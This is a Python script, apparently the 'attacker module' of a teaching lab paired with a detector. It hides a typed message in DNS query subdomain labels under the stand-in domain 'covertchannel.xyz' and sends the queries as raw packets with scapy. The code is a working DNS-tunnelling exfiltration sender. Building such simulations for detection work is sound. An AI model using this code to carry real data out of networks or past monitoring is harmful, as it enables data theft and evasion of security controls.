"""
dns_sender.py - DNS Covert Channel Sender (Attacker Module)

This module hides a secret message inside DNS query subdomain labels.
Example: If message is "HELLO", it sends a query like:
    SEVMTE8-.covertchannel.xyz

The encoded chunks become subdomains of a fake domain.
The detector flags these unusual DNS queries.

Usage:
    sudo python3 dns_sender.py

Requires: scapy (pip install scapy)
Must be run as root/sudo to send raw packets.
"""

import sys
import time

try:
    from scapy.all import IP, UDP, DNS, DNSQR, send, conf
except ImportError:
    print("[ERROR] Scapy not installed. Run: pip install scapy")
    sys.exit(1)

# Suppress Scapy's verbose output
conf.verb = 0

# Add parent directory to path to import our utils
sys.path.insert(0, '.')
from utils import chunk_message, get_target_ip


# The fake domain used as the "C2 server" domain in this simulation
COVERT_DOMAIN = "covertchannel.xyz"

# DNS server to send queries to (use target IP or a real/fake DNS server)
DNS_PORT = 53


def send_dns_covert(message: str, target_ip: str, delay: float = 0.6):
    """
    Encode a message and send it inside DNS query packets as subdomain chunks.

    How it works:
    - A normal DNS query looks like: google.com
    - In DNS tunneling, data is encoded in subdomain labels: <data>.attacker.com
    - Each chunk of encoded message becomes a subdomain label.
    - The detector flags these queries because:
        a) The subdomain looks random/encoded (high entropy)
        b) It queries a suspicious/unknown domain repeatedly

    Args:
        message   : The secret string to hide
        target_ip : IP of the DNS "server" (or target machine)
        delay     : Seconds between DNS queries
    """
    # Split encoded message into small chunks (DNS labels max 63 chars each)
    chunks = chunk_message(message, chunk_size=8)

    print(f"\n[DNS SENDER] Target    : {target_ip}")
    print(f"[DNS SENDER] Message   : {message}")
    print(f"[DNS SENDER] Chunks    : {chunks}")
    print(f"[DNS SENDER] Sending DNS queries...\n")

    for idx, chunk in enumerate(chunks):
        # Construct the covert DNS query domain: <encoded_chunk>.<fake_domain>
        query_domain = f"{chunk}.{COVERT_DOMAIN}"

        # Build the DNS packet:
        # UDP transport / DNS question record pointing to our crafted domain
        packet = (
            IP(dst=target_ip) /
            UDP(dport=DNS_PORT, sport=12345 + idx) /
            DNS(rd=1, qd=DNSQR(qname=query_domain))
        )

        try:
            send(packet)
            print(f"  [PKT {idx + 1:02d}] DNS Query → {query_domain}")
            time.sleep(delay)
        except PermissionError:
            print("[ERROR] Permission denied. Run with sudo: sudo python3 dns_sender.py")
            sys.exit(1)
        except Exception as e:
            print(f"[ERROR] Failed to send packet: {e}")
            sys.exit(1)

    print(f"\n[DNS SENDER] Done. Sent {len(chunks)} DNS query packet(s).")
    print(f"[DNS SENDER] Full message encoded across {len(chunks)} queries for domain: {COVERT_DOMAIN}")


def main():
    print("=" * 55)
    print("   DNS COVERT CHANNEL SENDER  (Attacker Module)")
    print("=" * 55)

    # Get the secret message from user
    message = input("Enter the secret message to hide in DNS queries: ").strip()
    if not message:
        message = "EXFILTRATED_DATA"
        print(f"[INFO] Using default message: {message}")

    # Get target IP
    target_ip = get_target_ip()

    # Send covert DNS packets
    send_dns_covert(message, target_ip)


if __name__ == "__main__":
    main()
